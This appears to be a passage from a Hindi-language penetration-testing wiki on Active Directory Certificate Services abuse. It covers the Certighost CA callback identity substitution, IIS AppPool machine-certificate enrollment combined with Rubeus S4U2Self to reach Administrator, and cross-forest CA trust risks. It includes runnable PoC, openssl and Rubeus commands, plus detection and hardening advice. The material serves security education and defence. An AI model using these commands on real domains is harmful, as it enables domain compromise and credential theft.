**Certighost** एक **AD CS enrollment chase / callback path** का दुरुपयोग करता है, जहाँ CA जारी किए जाने वाले certificate में रखी जाने वाली identity को निर्धारित करने के लिए requester द्वारा दिए गए request attributes पर भरोसा करता है। Public PoC में crafted request में शामिल होते हैं:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: attacker-controlled host/IP, जिससे CA संपर्क करेगा
- **`rmd`**: impersonate किए जाने वाले **target Domain Controller DNS name**

यदि CA उस chase का पालन करता है, तो वह attacker से **SMB/LSA (`445`)** और **LDAP (`389`)** के माध्यम से connect करेगा। Attacker एक **real machine account** (आमतौर पर default **`ms-DS-MachineAccountQuota`** के माध्यम से बनाया गया) उपयोग करता है, ताकि callback session एक valid domain principal के रूप में authenticate हो, लेकिन rogue services इसके बजाय **target DC** के identity attributes लौटाती हैं:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

यदि CA **returned identity को authenticated callback principal के साथ cryptographically bind नहीं करता**, तो वह **Domain Controller** के लिए certificate जारी कर सकता है, भले ही session ने attacker-controlled machine account के रूप में authenticate किया हो। इससे यह bug अवधारणात्मक रूप से **Certifried** से अलग है: AD attributes जैसे `dNSHostName` को rewrite करने के बजाय, attacker **CA callback resolution के दौरान identity data को substitute करता है**।<sup>[[2]](#references)</sup>

**उपयोगी preconditions:**

- कम privileges वाले **domain credentials**
- computer account **create या reuse** करने की क्षमता
- **CA** से attacker-controlled **ports `389` और `445`** तक network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** के Microsoft update ने **`cdc` के लिए DC validation** और **resolved-SID comparison** जोड़ा)

प्राप्त **`.pfx`** का उपयोग **PKINIT** के लिए किया जा सकता है, जिससे **`.ccache`** और published PoC flow में **target DC NT hash** प्राप्त होता है; यह सामान्यतः **full domain compromise** के लिए पर्याप्त होता है।

### दुरुपयोग

Public PoC पूरी chain को automate करता है:<sup>[[1]](#references)</sup>

1. Attacker-controlled **machine account** को create या reuse करें।
2. `389` और `445` पर **rogue LDAP और SMB/LSA listeners** शुरू करें।
3. Attacker-controlled **`cdc`** और target **`rmd`** attributes वाला certificate request submit करें।
4. CA को controlled machine account के रूप में rogue listeners से authenticate करने दें, लेकिन identity lookups के उत्तर **target DC** attributes के साथ दें।
5. CA-signed **DC certificate** प्राप्त करें, फिर उसका उपयोग **PKINIT** के लिए करें।
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC से उपयोगी runtime flags:

- `--listener <ip>`: `cdc` में advertise किए गए callback IP को स्पष्ट रूप से चुनें
- `--computer-name <NAME$>`: नया machine account बनाने के बजाय किसी मौजूदा machine account का reuse करें

**Operational notes:**

- PoC को **root** की आवश्यकता होती है क्योंकि यह **privileged ports** `389` और `445` पर bind करता है।
- सफल exploitation स्थानीय रूप से एक **DC `.pfx`** और **Kerberos `.ccache`** लिखता है।
- क्योंकि certificate एक **Domain Controller account** से map होता है, इसलिए आगे की actions में **certificate-based Kerberos auth**, **DCSync**, और recovered **machine NT hash** का reuse शामिल हो सकता है।<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment से उसी host के Administrator तक

`ApplicationPoolIdentity` के रूप में चलने वाला IIS pool network resources तक outbound access के लिए अपने host के **computer account** का उपयोग करता है। इसलिए `IIS AppPool\<POOL>` के रूप में code execution local token में low-privileged रहता है, लेकिन ऐसा AD CS request submit कर सकता है जिसे CA `HOST$` के रूप में authenticate करता है; यह outbound identity transition है, token impersonation या Potato-style local elevation नहीं।<sup>[[19]](#references)[[20]](#references)</sup>

इस chain के लिए domain-joined IIS host, RPC के माध्यम से reachable Enterprise CA, ऐसा published machine-authentication template जिसके लिए computer के पास enrollment rights हों, PKINIT support, और KDC/SMB reachability आवश्यक है। Custom pool identity outbound principal को बदल देती है, इसलिए `HOST$` मानने से पहले पुष्टि करें कि pool वास्तव में `ApplicationPoolIdentity` का उपयोग करता है।<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

Key pair और CSR को IIS server से अलग generate करें और private key को सुरक्षित रखें। Compromised worker से **केवल CSR** submit करें। [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) `CertificateAuthority.Request` को instantiate करता है, `CertificateTemplate:Machine` सेट करता है, `ICertRequest::Submit` call करता है, और issued certificate return करता है। CA configuration string `CAHOST\CA-NAME` का उपयोग करें; सामान्य `Machine` template subject को AD से बनाता है, इसलिए requester-supplied subject/SAN data आवश्यक नहीं है।<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Returned certificate को **matching retained key** के साथ combine करें। `certutil -MergePFX machine_cert.cer machine_cert.pfx` केवल तभी काम करता है जब Windows certificate को पहले से किसी accessible private key के साथ associate कर सके; अलग PEM files के लिए PKCS#12 को स्पष्ट रूप से create करें:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
PKINIT के लिए PFX का उपयोग करें और लौटाए गए computer TGT को तुरंत inject करने के बजाय base64 के रूप में रखें:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self plus same-host service substitution

S4U2Self किसी service को किसी अन्य user के authorization data वाली **अपने लिए** ticket प्राप्त करने देता है। Computer TGT के साथ, Rubeus किसी privileged user के लिए वह ticket request कर सकता है, लौटाए गए KRB-CRED में service name को CIFS से rewrite कर सकता है और उसे inject कर सकता है। यह local “delegate to thyself” primitive है: इसके लिए S4U2Proxy या `msDS-AllowedToDelegateTo` entry की आवश्यकता नहीं होती।<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Substituted ticket का उपयोग केवल **same computer account/key** वाली services द्वारा किया जा सकता है (यहाँ, `HOST` पर CIFS)। यह अन्य domain machines के लिए पुन: उपयोग योग्य Administrator ticket नहीं है। साथ ही, प्रदर्शित परिणाम Administrator के रूप में privileged SMB/filesystem access है; स्थानीय `NT AUTHORITY\SYSTEM` process प्राप्त करने के लिए अभी भी एक अलग remote-execution step आवश्यक है।<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detection and hardening

- CA पर Certification Services events **4886** (request received) और **4887** (issued) को correlate करें, ताकि IIS server accounts द्वारा किए गए अप्रत्याशित `Machine`-template requests का पता लगाया जा सके।<sup>[[19]](#references)[[24]](#references)</sup>
- DCs पर, certificate pre-authentication का उपयोग होने पर event **4768** में certificate fields शामिल होते हैं; web-server accounts के लिए किए गए असामान्य PKINIT TGT requests पर alert करें। इसके बाद privileged impersonated identity और उसी host से संबंधित **4769** requests की जाँच करें। क्योंकि Rubeus `/altservice` client-side पर KRB-CRED service name को rewrite करता है, इसलिए DC-side 4769 service name का `cifs` होना आवश्यक न मानें।<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` द्वारा CA RPC endpoints तक पहुँचने, अप्रत्याशित ASPX creation, Kerberos-authenticated access to administrative shares और secrets-dumping activity की तलाश करें। जहाँ संभव हो, app-tier access को CA RPC/KDC/SMB तक सीमित करें और उन computer enrollment rights या machine-authentication templates को हटा दें जिनकी operational रूप से आवश्यकता नहीं है।<sup>[[19]](#references)</sup>

## Passive Voice में Forests को Certificates से Compromise करना

### Compromised CAs द्वारा Forest Trusts को तोड़ना

**cross-forest enrollment** का configuration अपेक्षाकृत सरल बनाया जाता है। Resource forest का **root CA certificate** administrators द्वारा **account forests में publish** किया जाता है, और resource forest के **enterprise CA** certificates को प्रत्येक account forest के `NTAuthCertificates` और AIA containers में **जोड़ा** जाता है। स्पष्ट रूप से, यह arrangement resource forest के **CA को उन सभी forests पर पूर्ण control प्रदान करता है** जिनके लिए वह PKI manage करता है। यदि यह CA **attackers द्वारा compromise** कर लिया जाए, तो resource और account forests के सभी users के certificates **उनके द्वारा forge किए जा सकते हैं**, जिससे forest की security boundary टूट जाती है।<sup>[[6]](#references)</sup>

### Foreign Principals को दिए गए Enrollment Privileges

Multi-forest environments में, उन Enterprise CAs के संबंध में सावधानी आवश्यक है जो ऐसे **certificate templates publish** करते हैं, जो **Authenticated Users या foreign principals** (उस forest से बाहरी users/groups, जिससे Enterprise CA संबंधित है) को **enrollment और edit rights** प्रदान करते हैं।\
Trust के पार authentication होने पर, AD द्वारा **Authenticated Users SID** को user के token में जोड़ दिया जाता है। इसलिए, यदि किसी domain में ऐसा Enterprise CA है जिसके template में **Authenticated Users enrollment rights की अनुमति** है, तो किसी different forest का user उस template में **enroll कर सकता है**। इसी प्रकार, यदि किसी template द्वारा **enrollment rights किसी foreign principal को explicitly प्रदान** किए जाते हैं, तो इससे **cross-forest access-control relationship बनता है**, जिससे एक forest का principal दूसरे forest के template में **enroll कर सकता है**।

दोनों scenarios एक forest से दूसरे forest तक **attack surface में वृद्धि** करते हैं। Certificate template की settings का attacker द्वारा exploitation करके foreign domain में additional privileges प्राप्त किए जा सकते हैं।<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Revisiting “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation from IIS AppPool via the AD CS RPC Endpoint](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: A Kerberos authentication ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: A Kerberos service ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
